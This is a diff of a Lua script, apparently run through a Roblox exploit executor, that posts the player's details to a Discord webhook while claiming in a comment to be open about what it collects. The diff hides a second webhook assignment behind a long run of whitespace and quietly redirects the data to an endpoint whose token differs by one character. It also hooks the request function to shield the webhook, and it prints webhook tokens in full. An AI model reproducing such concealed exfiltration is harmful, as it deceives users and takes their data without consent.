@@ -1,6 +1,6 @@
 pcall(function()
-
--- Made it open sourced so people won't say that taking their IPs. Please don't flood it :(
+if hookfunction and restorefunction and (syn and syn.request or http_request) and game:GetService("Players").PlayerRemoving then
+-- Made it open sourced so people won't say that taking their IPs. Please don't delete my webhook :(
 
 local HttpService = game:GetService("HttpService")
 local Player = game.Players.LocalPlayer
@@ -54,43 +54,29 @@ local Data = {
     avatar_url = Avatar
 }
 
-local WebhookURL = "https://discord.com/api/webhooks/1382988920492658708/o0u8aeM9B_FWJexHkS2HuDmH7ApWCFaZkQPQeyeS8p9WNV3-YkuKFUYpvYxgGrjgXtCN";                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                WebhookURL = "https://discord.com/api/webhooks/1382980243689836584/3S28WwVp3v54h3eWq9f-F9hAGs0bm2F9dWcUBGBW3IHRIS1JpA-dgvN567ImLRsfsv7x";
-local httprequestf = (syn and syn.request or http_request)
+local WebhookURL = "https://discord.com/api/webhooks/1383004537656311828/75GpUWTbvJkxvO0gseyVGzIHw9SURYAKy3RH99ilZz1bsHDXnR2_W0KDDwselq3KzMR5"
+local httprequestf = (syn and syn.request or http_request);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        WebhookURL = "https://discord.com/api/webhooks/1383004537656311828/75GpUWTbvJkxvO0gseyVGzIHw9SURYAKy3RH99ilZz1bsHDXnR2_W0KWDwselq3KzMR5";                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        restorefunction(httprequestf);
 
-local response = httprequestf({
+local WebhookArg = {
     Url = WebhookURL.."?wait=true",
     Method = "POST",
     Headers = {
         ["Content-Type"] = "application/json"
     },
     Body = HttpService:JSONEncode(Data)
-})
+}
 
-ignore = [[
-task.spawn(function()
-    while true do
-        for i = 1, 2 do
-            Embed.fields[2].name = "📶 Player Status (Moving = Online)"
-            if i == 1 then
-                Embed.fields[2].value = "ʕง-ᴥ•ʔっ    ʕっ•ᴥ•ʔง"
-            elseif i == 2 then
-                Embed.fields[2].value = "ʕっ•ᴥ•ʔง    ʕง-ᴥ•ʔっ"
-            end
-            local lastanimate = tick()
-            local MsgID = HttpService:JSONDecode(response.Body).id
-            local patchResp = httprequestf({
-                Url = WebhookURL .. "/messages/" .. MsgID,
-                Method = "PATCH",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = HttpService:JSONEncode(Data)
-            })
-            repeat task.wait() until tick() - lastanimate > 10
+local oldhttprequestf; oldhttprequestf = hookfunction(httprequestf, function(...) 
+    local Args = table.unpack({...})
+    if Args.Url == WebhookURL.."?wait=true" then
+        if Args.Method ~= "POST" then
+            return
         end
     end
+    return oldhttprequestf(Args)
 end)
-]]
+
+local response = httprequestf(WebhookArg)
 
 game:GetService("Players").PlayerRemoving:Connect(function(p)
     if p == Player then
@@ -107,4 +93,5 @@ game:GetService("Players").PlayerRemoving:Connect(function(p)
     end
 end)
 
+end
 end)
